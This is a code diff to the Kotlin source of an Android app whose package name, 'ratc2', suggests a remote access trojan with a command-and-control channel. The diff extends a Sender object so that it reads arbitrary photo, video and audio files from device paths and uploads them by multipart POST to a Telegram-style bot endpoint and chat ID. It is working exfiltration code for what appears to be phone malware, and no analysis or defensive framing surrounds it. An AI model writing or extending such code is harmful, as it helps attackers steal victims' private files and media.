@@ -1,6 +1,7 @@
 package com.spud.ratc2
 
 import android.util.Log
+import java.io.File
 import java.io.OutputStream
 import java.net.HttpURLConnection
 import java.net.URL
@@ -27,13 +28,52 @@ object Sender {
         return c.inputStream.bufferedReader().readText()
     }
 
-    fun sendDocument(botBase: String, chatId: String, filename: String, content: String): Boolean {
+    fun sendDocument(botBase: String, chatId: String, filename: String, content: String): Boolean =
+        sendFile(botBase, chatId, "sendDocument", "document", filename, content.toByteArray(Charsets.UTF_8), "text/plain; charset=utf-8")
+
+    fun sendPhoto(botBase: String, chatId: String, path: String): Boolean {
+        val f = File(path)
+        if (!f.exists() || !f.canRead()) return false
+        if (f.length() > 10L * 1024 * 1024) return false
+        return sendFile(botBase, chatId, "sendPhoto", "photo", f.name, f.readBytes(), guessMime(f.name))
+    }
+
+    fun sendVideo(botBase: String, chatId: String, path: String): Boolean {
+        val f = File(path)
+        if (!f.exists() || !f.canRead()) return false
+        if (f.length() > 50L * 1024 * 1024) return false
+        return sendFile(botBase, chatId, "sendVideo", "video", f.name, f.readBytes(), "video/mp4")
+    }
+
+    fun sendAudio(botBase: String, chatId: String, path: String): Boolean {
+        val f = File(path)
+        if (!f.exists() || !f.canRead()) return false
+        if (f.length() > 50L * 1024 * 1024) return false
+        return sendFile(botBase, chatId, "sendAudio", "audio", f.name, f.readBytes(), guessMime(f.name))
+    }
+
+    private fun guessMime(name: String): String {
+        val n = name.lowercase()
+        return when {
+            n.endsWith(".mp3") -> "audio/mpeg"
+            n.endsWith(".m4a") -> "audio/mp4"
+            n.endsWith(".wav") -> "audio/wav"
+            n.endsWith(".ogg") -> "audio/ogg"
+            n.endsWith(".jpg") || n.endsWith(".jpeg") -> "image/jpeg"
+            n.endsWith(".png") -> "image/png"
+            n.endsWith(".gif") -> "image/gif"
+            n.endsWith(".webp") -> "image/webp"
+            n.endsWith(".mp4") -> "video/mp4"
+            else -> "application/octet-stream"
+        }
+    }
+
+    private fun sendFile(base: String, chatId: String, endpoint: String, field: String, filename: String, data: ByteArray, mime: String): Boolean {
         return try {
-            val boundary = "----SpudBoundary" + UUID.randomUUID().toString().replace("-", "")
-            val url = URL("$botBase/sendDocument")
-            val conn = url.openConnection() as HttpURLConnection
+            val boundary = "----Spud" + UUID.randomUUID().toString().replace("-", "")
+            val conn = URL("$base/$endpoint").openConnection() as HttpURLConnection
             conn.connectTimeout = 20000
-            conn.readTimeout = 60000
+            conn.readTimeout = 180000
             conn.requestMethod = "POST"
             conn.doOutput = true
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
@@ -46,9 +86,9 @@ object Sender {
             w("$chatId\r\n")
 
             w("--$boundary\r\n")
-            w("Content-Disposition: form-data; name=\"document\"; filename=\"$filename\"\r\n")
-            w("Content-Type: text/plain; charset=utf-8\r\n\r\n")
-            w(content)
+            w("Content-Disposition: form-data; name=\"$field\"; filename=\"${filename.replace("\"", "")}\"\r\n")
+            w("Content-Type: $mime\r\n\r\n")
+            out.write(data)
             w("\r\n")
 
             w("--$boundary--\r\n")
@@ -56,10 +96,10 @@ object Sender {
             out.close()
 
             val code = conn.responseCode
-            Log.i(TAG, "sendDocument code=$code")
+            Log.i(TAG, "$endpoint code=$code size=${data.size}")
             code in 200..299
         } catch (e: Exception) {
-            Log.e(TAG, "sendDocument error", e)
+            Log.e(TAG, "$endpoint error", e)
             false
         }
     }
